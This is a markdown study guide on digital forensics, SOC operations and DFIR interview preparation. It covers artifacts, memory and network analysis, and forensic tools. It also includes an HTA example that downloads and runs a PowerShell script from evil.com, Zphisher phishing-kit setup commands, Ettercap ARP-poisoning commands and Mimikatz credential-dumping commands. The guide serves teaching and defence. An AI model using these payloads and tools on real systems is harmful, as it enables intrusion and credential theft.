# 🔍 Digital Forensics & Cybersecurity Comprehensive Guide

A complete reference guide covering **Digital Forensics (DF)**, **Cyber Forensics (CF)**, and essential cybersecurity concepts with practical examples and tools.

## 📋 Table of Contents

* [📘 Basic Concepts](#-basic-concepts)
* [🔗 Chain of Custody](#-chain-of-custody)
* [🛡️ Security vs Privacy](#️-security-vs-privacy)
* [🎭 Threat Types & Attack Vectors](#-threat-types--attack-vectors)
* [🛠️ Forensics Tools & Techniques](#️-forensics-tools--techniques)
* [🦠 Malware Analysis](#-malware-analysis)
* [💾 Data Acquisition](#-data-acquisition)
* [🔄 Forensic Lifecycle](#-forensic-lifecycle)
* [🚨 STRIDE Framework](#-stride-framework)
* [🧰 Essential Tools List](#-essential-tools-list)
* [🖥️ Windows Security & Authentication](#️-windows-security--authentication)
* [🕵️ Anti-Forensics Techniques](#-anti-forensics-techniques)
* [📧 Email Headers](#-email-headers)
* [💾 Linux File Systems](#-linux-file-systems)
* [🗂️ Windows Registry & Forensics Artifacts](#️-windows-registry--forensics-artifacts)
* [💻 CMD vs PowerShell](#-cmd-vs-powershell)
* [📊 Windows Activity Monitoring](#-windows-activity-monitoring)
* [💻 System Internals & Memory Concepts](#-system-internals--memory-concepts)
* [🐍 Lua Programming & Malware](#-lua-programming--malware)
* [📱 Mobile Forensics](#-mobile-forensics)
* [🌐 Network Forensics](#-network-forensics)
* [🏢 Enterprise Security](#-enterprise-security)
* [🎯 SOC Operations](#-soc-operations)
* [🔍 DFIR Interview Preparation](#-dfir-interview-preparation)
* [🔬 Advanced Concepts](#-advanced-concepts)
* [📚 Additional Resources](#-additional-resources)

---

## 📘 Basic Concepts

### 🆚 Digital Forensics (DF) vs Cyber Forensics (CF)

| Aspect                  | Digital Forensics (DF)                             | Cyber Forensics (CF)                    |
| ----------------------- | -------------------------------------------------- | --------------------------------------- |
| **📜 Scope**            | Broad discipline covering all digital devices      | Focus on cybercrime & network incidents |
| **📂 Evidence Sources** | Computers, mobiles, IoT, storage                   | Network logs, servers, communications   |
| **🎯 Primary Use**      | Criminal/civil investigations, corporate incidents | Cybercrime investigations, breaches     |

---

## 🔗 Chain of Custody

**3️⃣ Core Principles:**

1. 🛅 **Keep in Confinement** – Secure storage, tamper-evident bags, access controls
2. ✍️ **Non-Repudiation** – Digital signatures, timestamps, handling logs
3. 🔒 **No Tampering** – Write blockers, forensic copies, preserve originals

📄 **Example Log:**

```
Evidence ID: CASE-2024-001-HD01
Item: Suspect's Laptop Hard Drive
Date/Time: 2024-01-15 09:30
Collected by: Detective Smith (#1234)
Transferred to: Forensics Lab Tech Johnson
Date/Time: 2024-01-15 11:45
Purpose: Digital forensic analysis
```

### 📋 Forensics Inquiry Checklist

When conducting forensics investigations:

1. **Inventory Management**
   - Asset list with IP addresses
   - MAC addresses
   - Device types and locations

2. **Critical Device Identification**
   - Any device with business impact = critical device
   - Senior management typically decides criticality
   - Document business impact assessment

---

## 🛡️ Security vs Privacy

* **🛡️ Security** – Protecting assets from unauthorized access/modification
  *Example:* Firewalls, encryption, access controls
* **🔏 Privacy** – Protecting identity-specific personal data
  *Example:* GDPR compliance, anonymization

---

## 🎭 Threat Types & Attack Vectors

### 🦠 Malware Categories

**File-based Malware**
- Traditional malware stored as files on disk
- Requires file system interaction
- Easier to detect with signature-based antivirus

**File-less Malware**
- Resides in memory only
- Uses legitimate system tools (PowerShell, WMI)
- Harder to detect and investigate

**0-Click Malware**
- Requires no user interaction
- Exploits vulnerabilities automatically
- High severity threat vector

**Specific Types:**
* **Trojan** – Disguised as legitimate software
* **Ransomware** – Encrypts files, demands payment
* **Rootkit** – Hides malicious activity
* **Keylogger** – Records keystrokes
* **Crypto Miners** – Uses resources for cryptocurrency mining

### 🎣 Phishing

* **Standard** – Mass targeting
* **Spear** – Targeted
* **Whaling** – High-profile targets
  💌 *Fake Email Example:*

```
From: security@bankofamerica-secure.com
Subject: Urgent: Account Verification
Click here to verify your account within 24 hours...
```

### 🎭 Spoofing

* **Email** – Fake sender
* **IP** – Forged addresses
* **DNS** – Malicious redirection

### 🧠 Social Engineering

* Pretending to be IT support
* Tailgating into secure areas
* USB baiting

---

## 🛠️ Forensics Tools & Techniques

### 🕸️ Zphisher

```bash
git clone https://github.com/htr-tech/zphisher
cd zphisher && chmod +x zphisher.sh && ./zphisher.sh
```

🔗 [Zphisher GitHub](https://github.com/htr-tech/zphisher)

### 💻 MITM Attacks

* **Ettercap** – `ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//`
* **Bettercap** – `sudo bettercap -iface wlan0`
  🔗 [Bettercap](https://www.bettercap.org/)

---

## 🦠 Malware Analysis

### 🔍 Static Analysis (Structure-based)

Examines source code, API calls, libraries without execution.

**Tools:**
* **Ghidra** – [Download](https://ghidra-sre.org/)
* **IDA Pro** – Commercial disassembler
* **OllyDbg** – [Download](http://www.ollydbg.de/)
* **x64dbg** – [Download](https://x64dbg.com/)

### ⚙️ Dynamic Analysis (Behavior-based)

Observes malware execution in controlled environment.

**Tools:**
* **Cuckoo Sandbox** – Automated malware analysis
* **Any.run** – Interactive sandbox
* **OllyDbg** – Manual dynamic analysis debugger

**Network Analysis during dynamic:**
- Monitor network connections
- Analyze C2 communications
- Track data exfiltration attempts

### 📄 Document-Based Malware Analysis

**Macro Malware:**
- Runs behind any Microsoft document file
- Embedded in Office documents (Word, Excel, PowerPoint)
- Uses VBA (Visual Basic for Applications) macros
- Auto-executes on document open (if macros enabled)
- Common delivery vector for ransomware and trojans

**Tools:**
* **oletools** – Analyze Microsoft Office documents
* **pdfid** – Identify suspicious PDF elements
* **pdf-parser** – Extract PDF objects and streams

### 💥 HTA Attack Example

```html
<script>
  var shell = new ActiveXObject("WScript.Shell");
  shell.run("powershell -c IEX(New-Object Net.WebClient).downloadString('http://evil.com/payload.ps1')");
</script>
```

🔗 [MITRE T1218.005](https://attack.mitre.org/techniques/T1218/005/)

### 🔑 Key Analysis Concepts

**Debugger vs Decompiler:**
* **Debugger** – Dynamic analysis tool that allows you to control and observe program execution in real-time (OllyDbg, x64dbg)
* **Decompiler** – Static analysis tool that converts compiled machine code (binary) back into higher-level programming language like C, C++, Java (Ghidra, IDA Pro)

**Key Artifacts:**
- Registry modifications
- File system changes
- Network indicators
- Process injection techniques
- Persistence mechanisms

---

## 💾 Data Acquisition

### 📊 Acquisition Types

**Physical vs Digital Data Acquisition:**

* **📂 Logical Acquisition** 
  - Faster, targeted files
  - Copies visible files and folders
  - Limited to allocated space

* **💽 Physical Acquisition** 
  - Bit-by-bit copy
  - Includes deleted data, slack space, unallocated sectors
  - Complete disk image
  - Forensically sound

### 🛠️ Creating Forensic Images

**Methods to create device images:**
1. **FTK Imager** – GUI-based imaging tool
2. **dd command** – `dd if=/dev/sda of=image.raw bs=4M`
3. **Autopsy** – Built-in imaging capabilities
4. **Mobile-specific tools** – Cellebrite, Oxygen Forensics

### 📦 Evidence Preservation

**Faraday Bag** – Blocks all wireless signals, prevents:
- Remote wiping
- Location tracking
- Incoming/outgoing communications
- Data modification

---

## 🔄 Forensic Lifecycle

1. 🔍 **Identification** – Recognize potential evidence
2. 📦 **Collection** – Secure and document evidence
3. 🧪 **Analysis** – Examine and interpret data
4. 📝 **Documentation** – Record findings and methodologies
5. 🗄️ **Preservation** – Maintain integrity for legal proceedings

---

## 🚨 STRIDE Framework

| Letter | Threat           | Example             | Mitigation       |
| ------ | ---------------- | ------------------- | ---------------- |
| S      | Spoofing         | Email/IP spoofing   | Strong auth      |
| T      | Tampering        | MITM, SQL injection | Integrity checks |
| R      | Repudiation      | Action denial       | Audit trails     |
| I      | Info Disclosure  | Data leaks          | Encryption       |
| D      | DoS              | Flood attacks       | Rate limiting    |
| E      | Priv. Escalation | Buffer overflows    | Least privilege  |

---

## 🧰 Essential Tools List

| Tool             | Purpose                    | Link                                     |
| ---------------- | -------------------------- | ---------------------------------------- |
| Autopsy          | Digital forensics          | [🔗](https://www.autopsy.com/download/)  |
| FTK Imager       | Evidence imaging           | [🔗](https://www.exterro.com/ftk-imager) |
| Ghidra           | Reverse engineering        | [🔗](https://ghidra-sre.org/)            |
| Velociraptor     | Endpoint monitoring        | [🔗](https://www.velocidx.com/)          |
| Volatility 3     | Memory forensics           | [🔗](https://volatilityfoundation.org/)  |
| EXIFtool         | Metadata extraction        | [🔗](https://exiftool.org/)              |
| Andriller        | Android forensics          | [🔗](https://github.com/den4uk/andriller)|
| Belkasoft        | Mobile/computer forensics  | [🔗](https://belkasoft.com/)             |
| Magnet AXIOM     | Digital investigation      | [🔗](https://www.magnetforensics.com/)   |
| Cellebrite UFED  | Mobile extraction          | [🔗](https://cellebrite.com/)            |
| Oxygen Forensics | Mobile forensics           | [🔗](https://www.oxygen-forensic.com/)   |

---

## 🖥️ Windows Security & Authentication

### 🔐 Active Directory (AD)

**What is Active Directory?**
- Centralized authentication and authorization service
- Manages users, computers, and resources in Windows networks
- Directory service for Windows domain networks

**Domain:**
- Logical grouping of network objects (e.g., pcapworkshop.net)
- Created in internal AD infrastructure
- Central authentication point

**Domain Controller:**
- Server managing AD domain
- Authenticates users and computers
- Stores user credentials and policies
- Handles permission changes across domain

**Admin Operations:**
- Login as admin directly, OR
- Use domain controller for centralized management
- Privilege escalation monitoring critical

### 🎫 Authentication Protocols

**Kerberos (KRB5)**
- Primary network authentication protocol
- Ticket-based authentication system
- Default in Active Directory environments

**Wireshark Analysis:**
```
Filter: kerberos.CNameString
Purpose: Check network login attempts
Protocol: KRB5
```

### 💻 Windows Commands

```cmd
net user                          # List users
net user user1 newpass123!        # Reset password
netstat -A -n -o                  # Check network connections
```

🔍 Look for unknown outbound TCP connections.

### 📊 Critical Event IDs

📄 [Windows Event IDs Reference](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)

**Key Event IDs:**
- **4624** – Successful logon
- **4724** – Password reset attempt
- **1102** – Audit log cleared (red flag!)
- **4625** – Failed logon
- **4648** – Logon using explicit credentials
- **4672** – Special privileges assigned

---

## 🕵️ Anti-Forensics Techniques

📄 [Anti Forensics Github](https://github.com/MikeHorn-git/WAFS?tab=readme-ov-file)

* 🗑️ **Log deletion** – Clearing event logs (Event ID 1102)
* 🧹 **Secure wiping** – Overwriting deleted data
* ⏳ **Timestamp tampering** – Modifying file metadata
* 🛡️ **Encryption** – Preventing data access
* 🎭 **Steganography** – Hiding data in images/files
* 🔄 **File system manipulation** – Hiding files in slack space

---

## 📧 Email Headers

Email headers contain metadata about message routing and delivery:

```
From: sender@example.com
To: recipient@example.com
Date: Mon, 15 Jan 2024 14:30:00 +0000
Message-ID: <abc123@mail.example.com>
Received: from mail.example.com by mx.recipient.com
X-Originating-IP: 192.168.1.100
```

**🔍 Key Fields for Forensics:**
* `Received:` - Shows email routing path (read bottom to top)
* `X-Originating-IP:` - Original sender's IP
* `Message-ID:` - Unique identifier
* `Date:` - Timestamp information
* `Return-Path:` - Actual sender email
* `Authentication-Results:` - SPF/DKIM/DMARC validation

---

## 💾 Linux File Systems

Common file systems supported in Linux:

* **ext4** - Default Linux file system
* **ext3/ext2** - Older extended file systems
* **XFS** - High-performance journaling
* **Btrfs** - Modern copy-on-write
* **NTFS** - Windows compatibility
* **FAT32/exFAT** - USB/SD card compatibility

### 📱 Mobile File Systems

**Android:**
- ext4 (userdata partition)
- F2FS (Flash-Friendly File System)

**iOS:**
- APFS (Apple File System)
- HFS+ (legacy)

**Mac:**
- APFS (default since macOS High Sierra)
- HFS+ (legacy)

### 🆚 NTFS vs FAT

| Feature | NTFS | FAT32 |
|---------|------|-------|
| Max file size | 16 EB (theoretical) | 4 GB |
| Permissions | Yes | No |
| Encryption | Yes (EFS) | No |
| Journaling | Yes | No |
| Use case | Modern Windows | USB drives, compatibility |

💡 **Linux Reality:** Linux is actually a **kernel**, not a complete operating system. Distributions like Ubuntu, CentOS combine Linux kernel with GNU tools.

---

## 🗂️ Windows Registry & Forensics Artifacts

### 🗝️ Registry Basics

**What is Registry?**
- Hierarchical database storing Windows configuration
- User settings, system settings, application data
- Critical for forensic investigations

**Registry Structure:**
```
HKEY_CURRENT_USER (HKCU) - User-specific settings
├── Software
├── System
└── Security

HKEY_LOCAL_MACHINE (HKLM) - System-wide settings
├── SOFTWARE
├── SYSTEM
├── SAM (Security Account Manager)
└── SECURITY
```

**Registry Files Location:**
```
User-specific:
C:\Users\[Username]\NTUSER.DAT (created at first login)

System-wide:
C:\Windows\System32\config\
├── SYSTEM
├── SOFTWARE
├── SAM
└── SECURITY
```

### 📝 Prefetch Files (.pf files / .pa files)

**Location:** `C:\Windows\Prefetch\`

**Purpose:**
Used to open or execute files fast. Keeps a record of the data which was previously opened.

**Forensic Value:**
- Tracks program execution history
- Shows last run time and frequency
- Execution count
- Files/directories accessed by program
- Useful for timeline analysis

**Limitations:**
- Only last 128 executions (Windows 7/8)
- Only last 1024 entries (Windows 10)
- Can be disabled by attackers

### 🗃️ ShellBags

**What are ShellBags?**
Track user's folder access history and view preferences.

**Location:** 
- `HKCU\Software\Microsoft\Windows\Shell`
- `HKCU\Software\Microsoft\Windows\ShellNoRoam`

**Forensic Value:**
- Shows deleted folders user accessed
- Remote folder access (network shares)
- USB device folder browsing
- Timeline of user activities
- Persists even after file/folder deletion

**Analysis Tools:**
- ShellBags Explorer
- Registry Explorer

### 🗑️ Orphan Files

**What are Orphan Files?**
Those files which don't have proper path or memory address. They give us the reflection of those files which were present previously.

**Forensic Significance:**
- Indicate deleted or hidden files
- Found in unallocated space
- Require disk image for recovery
- Help reconstruct deleted data

**Autopsy Limitations:**
- **Logical sources (.tar archives):** Autopsy treats them like folders of extracted files
  - No unallocated space in .tar — just structured container of existing files
  - Autopsy can't find orphan files — they aren't in the tar
  - "Picture Analyzer" and "Extension Mismatch Detector" modules still work
  - "Orphan Files" node will never appear for logical backups

**Bottom Line:**
To get orphan/deleted file recovery, you need a **disk image (.E01, .dd, etc.)** from the original system, NOT a .tar logical backup.

---

## 💻 CMD vs PowerShell

| Feature | CMD | PowerShell |
|---------|-----|------------|
| **Type** | Command interpreter | Object-oriented shell |
| **Objects** | Text-based | .NET objects |
| **Scripting** | Batch files (.bat) | Scripts (.ps1) |
| **Power** | Basic commands | Advanced automation |
| **Remote** | Limited | WinRM, PS Remoting |
| **Piping** | Text | Objects |

**🔍 PowerShell in Windows Forensics:**
* Execute commands remotely (Enter-PSSession)
* Query WMI (Windows Management Instrumentation)
* Access registry programmatically
* Parse event logs efficiently
* Analyze file metadata and timestamps
* Create detailed system reports
* Investigate lateral movement

**Common PowerShell Forensic Commands:**
```powershell
Get-EventLog -LogName Security
Get-Process | Select Name,Id,Path
Get-ChildItem -Recurse -Force
Get-WmiObject Win32_Process
Get-NetTCPConnection | Where {$_.State -eq "Established"}
```

---

## 📊 Windows Activity Monitoring

### 🎯 Key Artifacts for User Activity

* **📋 Event Logs** 
  - System logs: `C:\Windows\System32\winevt\Logs\System.evtx`
  - Security logs: `C:\Windows\System32\winevt\Logs\Security.evtx`
  - Application logs: `C:\Windows\System32\winevt\Logs\Application.evtx`

* **📁 Prefetch Files (.pf)** 
  - Location: `C:\Windows\Prefetch\`
  - Program execution tracking

* **🔗 Jump Lists** 
  - Recent files/programs accessed
  - Location: `C:\Users\[User]\AppData\Roaming\Microsoft\Windows\Recent\`

* **🗂️ Shell Bags** 
  - Folder navigation history
  - Persists even for deleted folders

### 📈 Timeline Analysis

**What is Timeline Analysis?**
- Chronological reconstruction of events
- Correlates multiple artifact sources
- Establishes sequence of user/system activities
- Critical for incident response

**Sources for Timeline:**
- File system timestamps (MAC times)
- Event logs
- Prefetch files
- Registry LastWrite times
- Browser history
- Network logs

**Tools:**
- Plaso/log2timeline
- Autopsy timeline feature
- X-Ways timeline

### 💾 RAM Dump Analysis

**Methods to capture RAM:**
1. **FTK Imager** – Live memory capture
2. **Magnet RAM Capture** – Free tool
3. **WinPmem** – Open-source dumper
4. **DumpIt** – Simple command-line tool

**Analysis with Volatility 3:**
```bash
# Basic commands
vol.py -f memory.dmp windows.info          # Image info
vol.py -f memory.dmp windows.pslist        # Running processes
vol.py -f memory.dmp windows.pstree        # Process tree
vol.py -f memory.dmp windows.netscan       # Network connections
vol.py -f memory.dmp windows.cmdline       # Command line arguments
```

💡 **Linux Memory Management:**
**Swap Memory** - Used when RAM is full
- Virtual memory extension on disk
- Location: `/swap` partition or `/swapfile`
- Forensic value: May contain sensitive data from memory
- Can persist after reboot

---

## 💻 System Internals & Memory Concepts

### 🔄 Processes, Threads, and Handlers

**Every task consists of multiple processes.**

**Components:**
* **Process** – Independent execution unit with its own memory space
* **Thread** – Lightweight execution unit within a process (shares process memory)
* **Handler** – Code that responds to events or exceptions

**Difference between Multi-tasking and Multi-processing:**
* **Multi-tasking** – Multiple tasks sharing single CPU (switches between them)
* **Multi-processing** – Multiple processes on multiple CPUs (true parallel processing)

### 💾 Memory Overflow Types

**What's the difference between Stack Overflow and Heap Overflow?**

**Stack Overflow:**
- Happens in stack memory (LIFO - Last In First Out)
- Caused by exceeding stack size (deep recursion, large local variables)
- Fixed, limited size (typically 1-8 MB)
- Fast allocation/deallocation

**Heap Overflow:**
- Happens in heap memory (dynamic allocation)
- Caused by buffer overflow in dynamically allocated memory
- Large, flexible size
- Slower allocation

**How this expression would process:**
```
(a+x)*c^d/e

Order of processing:
1. (a+x) - parentheses first
2. c^d - exponentiation
3. result * result - multiplication
4. result / e - division
```

### 🔧 CPU Registers in Malware Analysis

**What are Registers?**
Small, fast storage locations in the CPU used during program execution.

**Common Registers:**
* **EAX** – Accumulator (arithmetic, return values)
* **EBX** – Base register (pointer to data)
* **ECX** – Counter (loops)
* **EDX** – Data register (I/O operations)
* **ESI** – Source Index (memory operations)
* **EDI** – Destination Index (memory operations)
* **ESP** – Stack Pointer
* **EBP** – Base Pointer
* **EIP** – Instruction Pointer (next instruction)

**Tools:**
- Ghidra, IDA Pro (decompilers for static analysis)
- OllyDbg, x64dbg (debuggers for dynamic analysis)

---

## 🐍 Lua Programming & Malware

**🦠 Lua in Malware Development:**
* Lightweight scripting language (often embedded)
* Embedded in many applications (games, Adobe, Wireshark)
* **Advantage for attackers:** 
  - Less common = harder to detect
  - Limited analyst familiarity
  - Difficult to reverse engineer
* Used for:
  - Payload delivery
  - Evasion techniques
  - Modular malware components
  - Plugin-based architectures

**Compiler Concepts:**
- **Lex** – Lexical analyzer (tokenizer)
- **Yacc** – Parser generator (Yet Another Compiler Compiler)

---

## 📱 Mobile Forensics

### 🤖 Android Forensics

**Emulator vs Simulator:**
* **Emulator** – Replicates both hardware AND software (full device behavior)
* **Simulator** – Replicates software only (limited functionality)

### 📦 APK vs EXE Architecture

**APK (Android Package):**
- Actually a **ZIP file** (rename .apk → .zip to extract)
- Contains:
  - `classes.dex` – Dalvik Executable (bytecode)
  - AndroidManifest.xml
  - Resources (images, layouts)
  - Native libraries (.so files)
- Runs in **DVM (Dalvik Virtual Machine)** or ART runtime
- Platform-independent bytecode
- Memory addresses assigned at runtime

**EXE (Windows Executable):**
- **Compiled binary** (native machine code)
- Platform-specific (x86/x64)
- Direct memory addressing
- No virtual machine needed

**Key Difference:**
- APK = Packed/archived format
- EXE = Compiled format
- APK runs in VM, EXE runs directly on hardware

### 🛠️ Android Forensics Tools

**Primary Tools:**
1. **Andriller** – [GitHub](https://github.com/den4uk/andriller)
   - Android data extraction
   - Password cracking
   - Decryption utilities

2. **Belkasoft Evidence Center**
   - Mobile and computer forensics
   - Belka GPT integration for analysis

3. **Magnet AXIOM**
   - Comprehensive mobile forensics
   - Cloud data acquisition

4. **Cellebrite UFED**
   - Industry standard
   - Physical and logical extraction
   - Bypass lock screens

5. **Oxygen Forensics**
   - OS forensic analysis
   - Cloud extraction

### 🔧 ADB (Android Debug Bridge)

**Installation:**
🔗 [Install ADB Guide](https://www.xda-developers.com/install-adb-windows-macos-linux/)

**Essential ADB Commands:**
```bash
# Device Connection
adb devices                    # List connected devices
adb connect <ip>:<port>        # Wireless connection
adb disconnect                 # Disconnect device

# Wireless Setup
adb pair <ip>:<port>           # Pair device wirelessly
adb connect <ip>:<port>        # Connect after pairing

# File Operations
adb pull /sdcard/file.txt      # Copy from device
adb push file.txt /sdcard/     # Copy to device

# Backup/Restore
adb backup -all -f backup.ab   # Create full backup
adb restore backup.ab          # Restore backup

# Shell Access
adb shell                      # Interactive shell
adb shell ls /data/data/       # Execute single command

# Installation
adb install app.apk            # Install APK
adb uninstall com.package      # Uninstall app

# Logging
adb logcat                     # View device logs
adb logcat -c                  # Clear logs

# Device Info
adb shell getprop              # Device properties
adb shell dumpsys battery      # Battery info
```

### 🔓 Mobile Exploitation

**adbsploit:**
- Similar to Metasploit for Android
- Exploit framework for ADB-enabled devices
- Requires debugging enabled

**WakeLock Abuse:**
- Prevents device from sleeping
- Malware persistence technique
- Battery drain indicator

### 📱 Mobile Forensics Tasks

**Standard Investigation Tasks:**
1. Execute ADB commands on device (wired/wireless)
2. Create forensic image/backup of Android device
3. Exploit Android device using adbsploit (in controlled environment)
4. Analyze and backup device using Andriller

### 📚 Mobile Forensics Resources

**🔗 XDA Forums** – [XDA Developers](https://www.xda-developers.com/)
- Best resource for mobile forensics
- Latest Android updates and exploits
- Community-driven knowledge base
- ADB cheatsheets and tutorials

### 🚁 Drone Forensics

**GEO Coordinates Extraction:**
- **Source:** `.dat` files from drone flight logs
- Contains GPS coordinates, altitude, timestamps
- Flight path reconstruction
- Pilot location identification

**Key Artifacts:**
- Flight logs
- SD card data
- Controller connection logs
- WiFi/Bluetooth pairing records

---

## 🌐 Network Forensics

### 📊 Traffic Analysis Tools

**tcpdump (Linux):**
```bash
tcpdump -i eth0                    # Capture on eth0
tcpdump -i eth0 -w capture.pcap    # Write to file
tcpdump -r capture.pcap            # Read from file
tcpdump -i eth0 port 80            # Filter by port
```

**NetworkMiner (Windows):**
- Passive network sniffer
- Extracts files from PCAP
- OS fingerprinting
- Credential extraction

**Wireshark:**
- GUI packet analyzer
- Deep protocol inspection
- Display filters for analysis

### 🔍 Wireshark Display Filters

**Categorized Cheatsheet:**

**Generally Used:**
```
ip.addr == 192.168.1.1         # Specific IP
tcp.port == 80                 # HTTP traffic
dns                            # DNS queries
http                           # HTTP traffic
tcp.stream eq 0                # Follow TCP stream
```

**Forensics-Specific:**
```
http.request                   # HTTP requests only
kerberos.CNameString           # Network authentication (Kerberos)
smb2                           # SMB file sharing
ftp-data                       # FTP data transfers
http.request.method == "POST"  # POST requests
http contains "password"       # Credential leakage
```

**Security Analysis:**
```
tcp.flags.syn==1 and tcp.flags.ack==0  # SYN scan detection
tcp.analysis.retransmission            # Network issues
icmp.type == 8                         # ICMP echo (ping)
arp                                    # ARP traffic (poisoning detection)
```

**Malware Traffic Analysis:**
Reference: [malware-traffic-analysis.net](https://malware-traffic-analysis.net)

### 🌐 HTTP Request Flow

**User Action → HTTP Request:**
1. User clicks link/button
2. HTTP request generated from client system
3. Request sent to server (can be filtered: `http.request`)
4. Server processes and responds
5. Response sent back to client

**Firewall Analysis:**
- Filter outbound traffic: `http.request`
- Monitor unusual destinations
- Check for data exfiltration patterns

---

## 🏢 Enterprise Security

### 🏗️ Network Infrastructure

**Username and Password Creation in Networks:**
- Centralized through Active Directory
- Password policies enforced via GPO (Group Policy Objects)
- Complexity requirements
- Expiration policies

**Domain Components:**
- Domain Name: `company.net`
- Domain Controller: Central authentication server
- Organizational Units (OUs): Logical groupings
- Group Policy: Centralized configuration

### 🎓 Career Development

**OEM Certifications:**
- More valuable than graduation alone
- Vendor-specific training (Palo Alto, Cisco, Fortinet)
- Helps entry into enterprise security companies
- Demonstrates practical skills

**Vendor List Management:**
- Track approved security vendors
- Maintain vendor contacts
- Document approved solutions
- Compliance tracking

---

## 🎯 SOC Operations

### 🔴 SOC vs NOC

**SOC (Security Operations Center):**
- Monitors security events
- Incident response
- Threat detection and analysis
- Security tool management

**NOC (Network Operations Center):**
- Monitors network performance
- Uptime and availability
- Bandwidth management
- Tools: Zabbix, PRTG, Nagios

### 🛡️ SIEM Systems

**What is SIEM?**
- Security Information and Event Management
- Centralizes log collection and analysis
- Real-time threat detection
- Compliance reporting

**Popular SIEM Solutions:**
* **Wazuh** – Open-source SIEM/XDR
* **IBM QRadar** – Enterprise SIEM
* **Splunk** – Log management and SIEM
* **ELK Stack** – Elasticsearch, Logstash, Kibana

**Agent vs Agentless:**
* **Agent-based:**
  - Software installed on endpoints
  - More detailed data collection
  - Higher resource usage
  - Better visibility

* **Agentless:**
  - No software installation
  - Uses protocols (WMI, SSH, SNMP)
  - Less invasive
  - Limited visibility

### 🤖 SOAR (Security Orchestration, Automation, and Response)

**SOAR vs SIEM:**
- **O (Orchestration)** – Connects multiple security tools
- **A (Automation)** – Automates repetitive tasks
- **R (Response)** – Automated incident response workflows

**SOAR Platform: Shuffle**
- Open-source SOAR platform
- Integration with Wazuh
- Playbook automation
- Incident response workflows

**Shuffle + Wazuh Integration:**
- Automated alert triage
- Enrichment workflows
- Automated containment actions
- Custom playbooks

### 🎯 MITRE ATT&CK Framework

**Essential for SOC:**
- Adversary tactics and techniques
- Threat intelligence mapping
- Detection gap analysis
- Incident investigation framework
- 🔗 [MITRE ATT&CK](https://attack.mitre.org/)

**Basic Necessity:**
- Understand attack lifecycle
- Map detections to techniques
- Communicate with common language
- Threat hunting methodology

---

## 🔍 DFIR Interview Preparation

### 📋 Core DFIR Concepts

**1. Chain of Custody**
- Documentation of evidence handling
- Prevents tampering accusations
- Legal admissibility requirement

**2. Physical vs Digital Data Acquisition**
- Physical: Bit-by-bit disk copy
- Digital/Logical: File-level copy
- Trade-offs: speed vs completeness

**3. GPT vs MBR**
| Feature | GPT | MBR |
|---------|-----|-----|
| Max partitions | 128 | 4 primary |
| Max disk size | 9.4 ZB | 2 TB |
| Redundancy | Backup partition table | Single table |
| UEFI support | Yes | Limited |

**4. RAM Dump Methods (FTK Imager)**
- Method 1: FTK Imager GUI capture
- Method 2: Command-line capture
- Method 3: Remote memory capture (FTK Enterprise)

**5. RAM Dump Analysis (Volatility 3)**
```bash
# Essential commands for interviews
vol.py -f memory.dmp windows.info      # System info
vol.py -f memory.dmp windows.pslist    # Process list
vol.py -f memory.dmp windows.pstree    # Process hierarchy
vol.py -f memory.dmp windows.netscan   # Network connections
vol.py -f memory.dmp windows.cmdline   # Commands executed
```

**6. Static vs Dynamic Analysis**
- **Static (Structure-based):**
  - Source code analysis
  - API calls inspection
  - Library analysis
  - Tools: Ghidra, IDA Pro

- **Dynamic (Behavior-based):**
  - Network analysis
  - Sandbox execution
  - API monitoring
  - Tools: Cuckoo, OllyDbg

**7. RT Facts (Artifacts)**
- RT likely means "Runtime Artifacts" or key forensic artifacts
- Common artifacts: registry keys, prefetch, event logs, timeline data

**8. Timeline Analysis**
- Chronological event reconstruction
- Correlating multiple data sources
- MAC times (Modified, Accessed, Changed)
- Super timeline creation (Plaso)

**9. ShellBags**
- Track folder access history
- Persist after deletion
- Registry location: `HKCU\Software\Microsoft\Windows\Shell`
- Show remote folder access

**10. [Question Blank - Fill Based on Interview Context]**

**11. NTFS (New Technology File System)**
- Default Windows file system
- Features: permissions, encryption, journaling, compression
- Master File Table (MFT) – Critical for forensics
- Alternate Data Streams (ADS) – Data hiding

**12. Creating Forensic Images**
- **FTK Imager** – GUI tool
- **dd** – `dd if=/dev/sda of=image.dd bs=4M`
- **Guymager** – Linux GUI imaging
- **Verification:** Hash comparison (MD5/SHA256)

### 📁 File System Knowledge

**Android File Systems:**
- ext4 (most common for userdata)
- F2FS (Flash-Friendly File System)
- YAFFS2 (older devices)

**Mac File Systems:**
- APFS (current default)
- HFS+ (legacy)
- Case-sensitive variants

**iOS File Systems:**
- APFS (iOS 10.3+)
- HFS+ (older iOS versions)

### 🗝️ Registry Analysis

**What is Windows Registry?**
- Hierarchical database of Windows settings
- Stores user/system configurations
- Critical for forensics investigations

**Class Information:**
- Registry key classes
- CLSID (Class Identifier) for COM objects
- ShellBags class data

**Registry Analysis Tools:**
- Registry Explorer (Eric Zimmerman)
- RegRipper
- Registry Decoder

### 📸 EXIF Data

**What is EXIF?**
- Exchangeable Image File Format
- Metadata embedded in images
- Contains: GPS, camera settings, timestamps, device info

**Extraction Tool:**
- **EXIFtool** – [Download](https://exiftool.org/)

```bash
exiftool image.jpg               # View all EXIF
exiftool -GPS* image.jpg         # GPS data only
exiftool -all= image.jpg         # Remove all metadata
```

### 🦠 Malware Knowledge

**Malware Types:**
- **Trojan** – Disguised malware
- **Keylogger** – Records keystrokes
- **Cryptominer** – Uses resources for mining
- **Ransomware** – Encrypts files for ransom
- **RAT** – Remote Access Trojan

**Document-Based Malware:**
- Malicious macros in Office docs
- PDF exploits
- Tools: oletools, pdfid, pdf-parser

### 🔧 Forensic Tools Knowledge

**OS Forensics Tools:**
- **Oxygen Forensics** – Mobile/computer forensics
- **ADB** – Android Debug Bridge
- **Belkasoft Evidence Center** – Multi-platform forensics
- **Magnet AXIOM** – Digital investigation platform

**Belka GPT:**
- AI-powered analysis in Belkasoft
- Automated evidence interpretation
- Natural language queries for forensic data

---

## 🔬 Advanced Concepts

### 🔓 Credential Extraction

**Mimikatz:**
- Extracts Windows credentials from memory
- Kerberos ticket manipulation
- Pass-the-hash attacks
- 🔗 [GitHub](https://github.com/gentilkiwi/mimikatz)

**Usage Example:**
```
sekurlsa::logonpasswords    # Extract plaintext passwords
sekurlsa::tickets           # Dump Kerberos tickets
lsadump::sam                # Dump SAM database
```

### 🌐 Internet-Scale Intelligence

**Shodan:**
- Search engine for Internet-connected devices
- Find exposed services, cameras, databases
- Security assessment
- 🔗 [Shodan.io](https://www.shodan.io/)

**Use Cases:**
- Identify exposed assets
- IoT device discovery
